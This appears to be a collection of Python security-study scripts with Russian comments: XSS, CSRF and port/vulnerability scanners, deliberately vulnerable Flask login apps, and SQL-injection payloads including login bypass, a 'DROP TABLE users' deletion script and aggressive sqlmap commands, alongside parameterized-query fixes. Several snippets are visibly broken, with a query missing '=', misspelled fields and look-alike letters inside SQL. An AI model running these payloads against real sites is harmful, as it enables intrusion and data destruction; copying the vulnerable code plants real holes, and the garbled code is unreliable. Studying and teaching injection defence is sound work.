            "<script>" in response.text.lower(),  # Теги скриптов не экранированы
            "onerror=" in response.text.lower()  # Атрибуты событий
        ]
        
        return any(conditions)

    def report_vulnerability(self, url, param, payload, type, context):
        """Записывает найденную уязвимость"""
        vulnerability = {
            "url": url,
            "parameter": param,
            "payload": payload,
            "type": type,
            "context": context,
            "severity": "High"
        }
        
        self.vulnerabilities.append(vulnerability)
        print(f"\n[!] Найдена {type} уязвимость:")
        print(f"    URL: {url}")
        print(f"    Параметр: {param}")
        print(f"    Контекст: {context}")
        print(f"    Payload: {payload[:50]}...")

    def crawl(self, max_urls = 10):
        """Рекурсивно обходит сайт"""
        urls = set()
        urls.add(self.target_url)
        
        while urls and len(self.tested_urls) < max_urls:
            url = urls.pop()
            
            try:
                response = self.session.get(url)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                for link in soup.find_all('a', href = True):
                    absolute_url = urljoin(url, link['href'])
                    if self.target_url in absolute_url and absolute_url not in self.tested_urls:
                        urls.add(absolute_url)
                
                self.scan_url(url)
            
            except Exception as e:
                print(f"[!] Ошибка при обработке {url}: {e}")

    def save_results(self):
        """Сохраняет результаты в JSON файл"""
        with open(self.output_file, 'w') as f:
            json.dump(self.vulnerabilities, f, indent = 4)
        
        print(f"\n[+] Результаты сохранены в {self.output_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description = "XSS Scanner")
    parser.add_argument("-u", "--url", required = True, help = "Целевой URL")
    parser.add_argument("-o", "--output", default = "xss_results.json", help = "Файл для результатов")
    parser.add_argument("-d", "--depth", type = int, default = 5, help = "Глубина сканирования")
    args = parser.parse_args()
    
    scanner = XSSScanner(args.url, args.output)
    scanner.crawl(args.depth)
    scanner.save_results()

# =====================================================================================================================================

# CSRF Vulnerability Scanner
# Базовый тест (без аутентификации): python csrf_scanner.py -u https://example.com/form-page
# Тест с аутентификацией (если нужна проверка защищенных форм): 
# python csrf_scanner.py -u https://example.com/account/change-password -c "your_session_cookie_value"
# Сохранение результатов в указанный файл: python csrf_scanner.py -u https://example.com -o results.json

import requests
from bs4 import BeautifulSoup
import argparse
import json
import re

class CSRFTester:
    def __init__(self, target_url, session_cookie = None):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        
        if session_cookie:
            self.session.cookies.set('session', session_cookie)
        
        # Шаблоны для поиска CSRF-токенов
        self.csrf_patterns = [
            r'<input[^>]*name=["\']csrf_token["\'][^>]*>',
            r'<meta[^>]*name=["\']csrf-token["\'][^>]*>',
            r'<input[^>]*name=["\']_token["\'][^>]*>',
            r'<input[^>]*name=["\']authenticity_token["\'][^>]*>'
        ]

    def test_csrf_protection(self):
        """Основной метод тестирования CSRF уязвимостей"""
        print(f"[*] Тестирование CSRF защиты на {self.target_url}")
        
        # 1. Проверяем наличие CSRF-токенов в формах
        forms = self.get_forms()
        if not forms:
            print("[!] На странице не найдено форм для тестирования")
            return
        
        for form in forms:
            form_details = self.analyze_form(form)
            print(f"\n[+] Найдена форма: {form_details['action']}")
            
            # 2. Проверяем наличие CSRF-токена в форме
            csrf_token = self.find_csrf_token(form_details)
            
            if csrf_token:
                print(f"[*] Обнаружен CSRF-токен: {csrf_token[:20]}...")
                # Тестируем форму с неверным токеном
                self.test_invalid_csrf(form_details, csrf_token)
            else:
                print("[!] CSRF-токен не найден - возможная уязвимость")
                # Тестируем форму без токена
                self.test_no_csrf(form_details)
    
    def get_forms(self):
        """Получает все формы со страницы"""
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"[!] Ошибка при получении форм: {e}")
            return []

    def analyze_form(self, form):
        """Анализирует HTML-форму и извлекает детали"""
        details = {
            'action': form.attrs.get('action', self.target_url),
            'method': form.attrs.get('method', 'get').lower(),
            'inputs': []
        }
        
        for input_tag in form.find_all('input'):
            input_details = {
                'type': input_tag.attrs.get('type', 'text'),
                'name': input_tag.attrs.get('name'),
                'value': input_tag.attrs.get('value', '')
            }
            details['inputs'].append(input_details)
        
        return details

    def find_csrf_token(self, form_details):
        """Ищет CSRF-токен в форме"""
        for input_field in form_details['inputs']:
            if input_field['name'] and any(name in input_field['name'].lower() 
               for name in ['csrf', '_token', 'authenticity_token']):
                return input_field['value']
        
        # Дополнительная проверка в теле страницы
        response = self.session.get(self.target_url)
        for pattern in self.csrf_patterns:
            match = re.search(pattern, response.text)
            if match:
                return match.group(0)
        
        return None

    def test_no_csrf(self, form_details):
        """Тестирует форму без CSRF-токена"""
        data = {}
        for input_field in form_details['inputs']:
            if input_field['type'] == 'hidden' and not any(
               name in input_field['name'].lower() 
               for name in ['csrf', '_token']):
                data[input_field['name']] = input_field['value']
            elif input_field['type'] not in ['submit', 'button']:
                data[input_field['name']] = 'test_value'
        
        result = self.submit_form(form_details, data)
        if result and result.status_code in [200, 302]:
            self.vulnerabilities.append({
                'url': self.target_url,
                'form_action': form_details['action'],
                'vulnerability': 'Missing CSRF Protection',
                'severity': 'High'
            })
            print("[!] Уязвимость CSRF обнаружена: форма принимает запросы без токена")

    def test_invalid_csrf(self, form_details, original_token):
        """Тестирует форму с неверным CSRF-токеном"""
        data = {}
        invalid_token = 'invalid_csrf_token_12345'
        
        for input_field in form_details['inputs']:
            if input_field['type'] == 'hidden' and any(
               name in input_field['name'].lower() 
               for name in ['csrf', '_token']):
                data[input_field['name']] = invalid_token
            elif input_field['type'] not in ['submit', 'button']:
                data[input_field['name']] = input_field['value'] or 'test_value'
        
        result = self.submit_form(form_details, data)
        if result and result.status_code in [200, 302]:
            self.vulnerabilities.append({
                'url': self.target_url,
                'form_action': form_details['action'],
                'vulnerability': 'Weak CSRF Protection',
                'severity': 'Medium'
            })
            print("[!] Возможная уязвимость CSRF: форма принимает запросы с неверным токеном")

    def submit_form(self, form_details, data):
        """Отправляет форму"""
        url = form_details['action']
        if not url.startswith(('http://', 'https://')):
            url = urljoin(self.target_url, url)
        
        try:
            if form_details['method'] == 'post':
                return self.session.post(url, data = data)
            else:
                return self.session.get(url, params = data)
        except Exception as e:
            print(f"[!] Ошибка при отправке формы: {e}")
            return None

    def save_results(self, filename='csrf_results.json'):
        """Сохраняет результаты тестирования"""
        with open(filename, 'w') as f:
            json.dump(self.vulnerabilities, f, indent = 4)
        print(f"\n[+] Результаты сохранены в {filename}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'CSRF Vulnerability Scanner')
    parser.add_argument('-u', '--url', required = True, help = 'Target URL to test')
    parser.add_argument('-c', '--cookie', help = 'Session cookie for authenticated testing')
    parser.add_argument('-o', '--output', default = 'csrf_results.json', help = 'Output file')
    
    args = parser.parse_args()
    
    scanner = CSRFTester(args.url, args.cookie)
    scanner.test_csrf_protection()
    scanner.save_results(args.output)

# ====================================================================================================================================

# Advanced Port Scanner with Vulnerability Detection
# Basic scan: python port_scanner.py 192.168.1.1
# Scan specific ports: python port_scanner.py 192.168.1.1 -p 21,22,80,443
# Custom thread count and output file: python port_scanner.py 192.168.1.1 -t 200 -o scan_results.json

import socket
import concurrent.futures
import nmap
import argparse
import json
from datetime import datetime

class PortScanner:
    def __init__(self, target, ports = None, threads = 100, timeout = 1.0):
        self.target = target
        self.ports = ports if ports else self.get_common_ports()
        self.threads = threads
        self.timeout = timeout
        self.results = []
        self.vulnerabilities = []
        self.nm = nmap.PortScanner()
        
    def get_common_ports(self):
        """Return a list of commonly used ports"""
        return {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            135: 'MS RPC',
            139: 'NetBIOS',
            143: 'IMAP',
            443: 'HTTPS',
            445: 'SMB',
            3389: 'RDP',
            5900: 'VNC',
            8080: 'HTTP Alt'
        }

    def scan_port(self, port):
        """Scan a single port"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(self.timeout)
                result = s.connect_ex((self.target, port))
                if result == 0:
                    service = self.get_common_ports().get(port, 'Unknown')
                    self.results.append({'port': port, 'status': 'open', 'service': service})
                    return port
        except Exception as e:
            pass
        return None

    def run_scan(self):
        """Run the port scan with multithreading"""
        print(f"[*] Starting scan of {self.target}")
        open_ports = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers = self.threads) as executor:
            future_to_port = {executor.submit(self.scan_port, port): port for port in self.ports}
            for future in concurrent.futures.as_completed(future_to_port):
                port = future_to_port[future]
                try:
                    if future.result():
                        open_ports.append(future.result())
                except Exception as e:
                    pass

        if open_ports:
            print("\n[+] Open ports found:")
            for port in sorted(open_ports):
                service = self.get_common_ports().get(port, 'Unknown')
                print(f"    Port {port}: {service}")
            self.vulnerability_scan(open_ports)
        else:
            print("\n[-] No open ports found")

    def vulnerability_scan(self, open_ports):
        """Perform vulnerability assessment on open ports"""
        print("\n[*] Starting vulnerability assessment...")
        
        # Nmap service/version detection
        port_str = ','.join(map(str, open_ports))
        self.nm.scan(hosts = self.target, ports = port_str, arguments = '-sV --script=banner,vulners')
        
        for host in self.nm.all_hosts():
            for proto in self.nm[host].all_protocols():
                ports = self.nm[host][proto].keys()
                for port in ports:
                    service = self.nm[host][proto][port]
                    
                    # Check for common vulnerabilities
                    vulns = self.check_common_vulns(port, service)
                    
                    if vulns:
                        self.vulnerabilities.append({
                            'port': port,
                            'service': service['name'],
                            'version': service.get('version', 'unknown'),
                            'vulnerabilities': vulns
                        })
        
        if self.vulnerabilities:
            print("\n[!] Potential vulnerabilities found:")
            for vuln in self.vulnerabilities:
                print(f"\n    Port {vuln['port']} ({vuln['service']} {vuln.get('version', '')}):")
                for issue in vuln['vulnerabilities']:
                    print(f"      - {issue}")
        else:
            print("\n[-] No obvious vulnerabilities detected")

    def check_common_vulns(self, port, service):
        """Check for known vulnerabilities based on service/port"""
        vulns = []
        service_name = service['name'].lower()
        product = service.get('product', '').lower()
        version = service.get('version', '')
        
        # FTP checks
        if port == 21:
            if 'anonymous' in service.get('banner', '').lower():
                vulns.append("Anonymous FTP login allowed")
            if not service.get('tls', False):
                vulns.append("FTP without encryption (credentials transmitted in clear text)")
        
        # SSH checks
        if port == 22:
            if 'openssh' in product:
                if version and version.split('.')[0] < '8':
                    vulns.append("Outdated OpenSSH version (potential vulnerabilities)")
            if 'protocol 1' in service.get('banner', '').lower():
                vulns.append("SSH Protocol 1 enabled (insecure)")
        
        # RDP checks
        if port == 3389:
            if not service.get('ssl', False):
                vulns.append("RDP without encryption (credentials transmitted in clear text)")
            if 'nla' not in service.get('banner', '').lower():
                vulns.append("Network Level Authentication not enforced")
        
        # SMB checks
        if port == 445:
            if 'windows' in product:
                if version and '7' in version or '2008' in version:
                    vulns.append("Potential EternalBlue vulnerability (MS17-010)")
            if 'samba' in product and version and version.split('.')[0] < '4':
                vulns.append("Outdated Samba version (potential vulnerabilities)")
        
        # HTTP checks
        if port in [80, 443, 8080]:
            if 'apache' in product and version and version.split('.')[0] < '2':
                vulns.append("Outdated Apache version")
            if 'iis' in product and version and '7.5' in version:
                vulns.append("Potential IIS vulnerabilities")
        
        return vulns

    def save_results(self, filename = None):
        """Save scan results to JSON file"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"scan_results_{self.target}_{timestamp}.json"
        
        results = {
            'target': self.target,
            'scan_time': datetime.now().isoformat(),
            'open_ports': self.results,
            'vulnerabilities': self.vulnerabilities
        }
        
        with open(filename, 'w') as f:
            json.dump(results, f, indent = 4)
        
        print(f"\n[+] Results saved to {filename}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Advanced Port Scanner with Vulnerability Detection')
    parser.add_argument('target', help = 'Target IP address or hostname')
    parser.add_argument('-p', '--ports', help = 'Specific ports to scan (comma-separated)')
    parser.add_argument('-t', '--threads', type = int, default = 100, help = 'Number of threads to use')
    parser.add_argument('-o', '--output', help = 'Output file name')
    
    args = parser.parse_args()
    
    # Process ports argument
    ports = None
    if args.ports:
        ports = [int(p) for p in args.ports.split(',')]
    
    scanner = PortScanner(args.target, ports, args.threads)
    scanner.run_scan()
    
    if args.output or (scanner.results and scanner.vulnerabilities):
        scanner.save_results(args.output)

# ======================================== Использование SQL-инъекций для атак ===================================================
# Примеры SQL-инъекций
# SQL-инъекция в запрос SELECT
# SELECT * FROM users WHERE username = 'admin' AND password = 'password';

# Если злоумышленник введет в поле usernaшe значение adniin' --, запрос станет:
# SELECT * FROM users WHERE username = 'admin' --' AND password = lpassword';

# SQL-инъекция с использованием логического выражения
# SELECT * FROM users WHERE username = 'admi_n' AND password = 'password';

# Если злоумышленник введет в поле нseгname значение аdшiн' OR '1'=' 1, запрос станет:
# SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND passord = 'password';

# Поскольку выражение '1'='1' всегда истинно, злоумышленник получит доступ к данным.

# FLASK
from flask import Flask, request, g
import sqlite3

app = Flask(__name__)
DATABASE = 'test.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/ login', methods = [ 'GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # Уязвимый SQL-зaпpoc
        query = f"SELECT * FROM users WHERE username'{username}' AND password = '{password}'"
        print(query)
        cur = get_db().execute(query)
        user = cur.fetchone()
        if user:
            return f"Welcome, {username}!"
        else:
            return "Invalid credentials!"
    return '''
        <form method="post">
            Username: <input type="text" name="useiname"><br>
            Password: <input type="password"
            name="password"><br>
            <input type="submit" value="Login">
        </form>
    '''
if __name__== '__main__':
    app.run(debug = True)

# Защита от SQL-инъекций
# Использование параметризованных запросов.
@app.route('/login', methods = ['GET', 'POST'])
def login() :
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        # Безопасный параметризованный SQL-зaпpoc
        query = "SELECT * FROM users WHERE username = ? AND password = ?"
        cur = get_db() .execute(query, (username, password))
        user = cur.fetchone()
        if user:
            return f"Welcome, { username} ! "
        else:
            return "Invalid credentials!"
    return '''
        <form method="post">
            Username: <input type="text" name="username"><br>
            Password: <input type="password"
            name="password"><br>
            <input type="submit" value="Login">
        </form>
    '''

# Использование ОRМ (Object-Relational Mapping).
from flask import Flask, request
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE URI'] = 'sqlite:///test.db'
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key = True)
    username = db.Column(db.String(80), unique = True, nullable = False)
    password = db.Column(db.String(120), nullabe = False)


@app.route('/login', methods = [ 'GET', 'POST' ] )
def login():
    if request.method == 'POST':
        username = request.form['username' ]
        password = request.form['password']
        
        # Безопасный запрос с использованием ОRМ
        user = User.query.filter_by(username = username,
        password = password).first()
        if user:
            return f"Welcome, {username} ! "
        else:
            return "Invalid credentials!"
    return '''
        <form method="post">
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
    '''
if __name__== '__main__':
    app.run(debug = True)

# Фильтрация и экранирование пользовательского ввода.
username = input("Введите и мя пользователя: ")
# SQL-зaпpoc без защиты от SQL-инъекции
sql_query = "SELECT * FROM users WHERE username = ' {} '".format(username)

# Если пользователь введет в поле ввода следующее значение: 'OR '1'='1, то окончательный SQL-зaпpoc будет выглядеть так:
# SELECT * FROM users WHERE username = '' OR '1'='1'

# SQL-зaпpoc без защиты от SQL-инъекции
sql_query = "SELECT * FROM users WHERE username = ' {} '".format(username)

# Пример использования SQL-инъекций на Python в веб-приложении
import sqlite3

# Получаем имя пользователя из ввода
username = input("Введите имя пользователя: ")

# SQL-зaпpoc без защиты от SQL-инъекции
sql_query = "SELECT * FROM users WHERE username = ' {} '".format(username)

# Подключение к базе данных SQLite
conn = sqlite3.connect('database.db')
cursor = conn.cursor()

# Выполнение SQL-зaпpoca
cursor.execute(sql_query)

# Получение результатов запроса
results = cursor.fetchall()

# Вывод результатов
for row in results:
    print(row)

# Закрытие соединения
conn.close()

# Если пользователь введет в поле имя пользователя следующее значение: 'OR '1'='1, то SQL-зaпpoc будет выглядеть следующим образом:
# SELECT * FROM users WHERE username = '' OR '1'='1'

# пример, демонстрирующий, как SQL-инъекция может быть использована для атаки на веб-приложение на Python с использованием Flask и SQLite
from flask import Flask, request, render_template
import sqlite3
app = Flask(__name__)

# Подключение к базе данных SQLite
conn = sqlite3.connect('users.db')
cursor = conn.cursor()

# Создание таблицы пользователей (для простоты)
cursor.execute('''CREATE TABLE IF NOT EXISTS users(
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password TEXT NOT NULL
)''')
conn.commit()

# Роут для регистрации нового пользователя
@app.route('/register', methods = ['POST'])
def register():
    request.form['username']
    username
    password = request.form['password']

    # Подготовка SQL-зaпpoca
    sql_query = "INSERT INTO users (username, password) VALUES('{}', '{}') ".format(username, password)

    # Выполнение SQL-зaпpoca
    cursor.execute(sql_query)
    conn.commit()
    return "Пользователь успешно зарегистрирован!"

# Роут для аутентификации пользователя
@app.route('/login', methods =['POST'])
def login():
    username = request.form['username']
    password = request.form ['password']
    # Подготовка SQL-зaпpoca
    sql_query = "SELECT * FROM users WHERE username = '{}' AND password = '{}'".format(username, password)

    # Выполнение SQL-зaпpoca
    cursor.execute(sql_query)
    user = cursor.fetchone()
    if user:
        return "Вы успешно вошли в систему!"
    else:
        return "Неверное имя пользователя или пароль!"
    
if __name__=='__main__':
    app.run(debug = True)

# Предположим, злоумышленник вводит следующее значение в поле "usemame" при попытке входа в систему: admin' --
# Этот ввод изменит окончательный SQL-зaпpoc в рауте /login следующим образом:
# SELECT * FROM users WHERE username = 'admin' --' AND password = 'password'

# Примеры использования SQL-инъекций для атак
# Получение данных аутентификации
import requests

# Предположим, что у нас есть URL для аутентификации
url = 'https://www.example.com/login'

# Payload для атаки SQL-инъекции
payload = "' OR '1' ='1"

# Отправляем запрос с внедренным payload'oм
response = requests.post(url, data = {'username': payload, 'password': payload})

# Анализируем ответ на наличие признаков успешной аутентификации
if 'Вход выполнен успешно' in response.text:
    print('Yдaлocь выполнить вход в систему с помощью SQL­-инъекции ! ')

# Удаление данных из базы данных
import requests

# URL для удаления данных из базы данных
url = 'https://www.example.com/delete_user'

# Payload для удаления всех записей из таблицы пользователей
payload = "'; DROP TABLE users; --"

# Отправляем запрос с внедренным payload'oм
response = requests.get(url + '?id=' + payload)

# Проверяем, были ли данные успешно удалены
if response.status_code == 200:
    print('Данные успешно удалены из таблицы users! ')

# =================================================================================================================================
# Пример безопасного кода на Python с использованием параметризованных запросов
import sqlite3

def get_user(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # Безопасный запрос с параметрами
    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
    user = cursor.fetchone()
    
    conn.close()
    return user

# ================================================================================================================================

# Пример уязвимого Flask-приложения (НЕ ИСПОЛЬЗОВАТЬ В PRODUCTION!)
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/update_balance', methods = ['GET'])
def update_balance():
    user_id = request.args.get('user_id')
    new_balance = request.args.get('balance')
    
    conn = sqlite3.connect('test.db')
    cursor = conn.cursor()
    
    # Уязвимый SQL-запрос (подвержен инъекции)
    query = f"UPDATE users SET balance = {new_balance} WHERE id = {user_id}"
    cursor.execute(query)
    conn.commit()
    conn.close()
    
    return "Баланс обновлен!"

if __name__ == '__main__':
    app.run(debug = True)

# Используйте параметризованные запросы
# Безопасная версия (на Python + SQLite)
query = "UPDATE users SET balance = ? WHERE id = ?"
cursor.execute(query, (new_balance, user_id))

# ORM (например, SQLAlchemy)
from sqlalchemy import create_engine, Table, MetaData

engine = create_engine('sqlite:///test.db')
metadata = MetaData()
users = Table('users', metadata, autoload_with = engine)

# Безопасное обновление
stmt = users.update().where(users.c.id == user_id).values(balance = new_balance)
engine.execute(stmt) 

# SQLMap (автоматическое обнаружение SQL-инъекций)
# sqlmap -u "http://example.com/update_balance?user_id=1&balance=100" --data="user_id=1&balance=100" --risk=3 --level=5

# ======================================================================================================================================

# Как защититься от таких атак?
# Безопасный код (Python + SQLite)
import sqlite3

def delete_user(user_id):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # Параметризованный запрос (защита от инъекций)
    cursor.execute("DELETE FROM users WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()

# SQLMap (только с разрешения владельца): sqlmap -u "http://example.com/delete?id=1" --method=GET --risk=3 --level=5

# ====================================================================================================================================

# Тестовый скрипт для проверки уязвимости (только для образовательных целей)
import requests

def test_xss_injection(target_url, param, test_string):
    """
    Проверяет возможность внедрения XSS через SQL-инъекцию
    """
    payloads = [
        "'\"><script>alert('XSS')</script>",
        "' OR 1=1; UPDATE pages SET content='<script>alert(1)</script>' WHERE id=1;--"
    ]
    
    for payload in payloads:
        try:
            response = requests.get(
                f"{target_url}?{param}={payload}",
                timeout=5
            )
            
            if payload.lower() in response.text.lower():
                print(f"[!] Возможна уязвимость с payload: {payload[:50]}...")
                print(f"    URL: {response.url}")
        except Exception as e:
            print(f"[Ошибка] {e}")

# Пример использования (только для тестовых сайтов с разрешения)
test_xss_injection(
    "http://test-site.example.com/page",
    "id",
    "xss_test"
)

# Защита от SQL-инъекций:
# Используйте параметризованные запросы
cursor.execute("SELECT * FROM pages WHERE id = %s", (page_id,))

# Защита от XSS:
# Экранируйте вывод в HTML (Python пример)
from html import escape
safe_content = escape(user_content)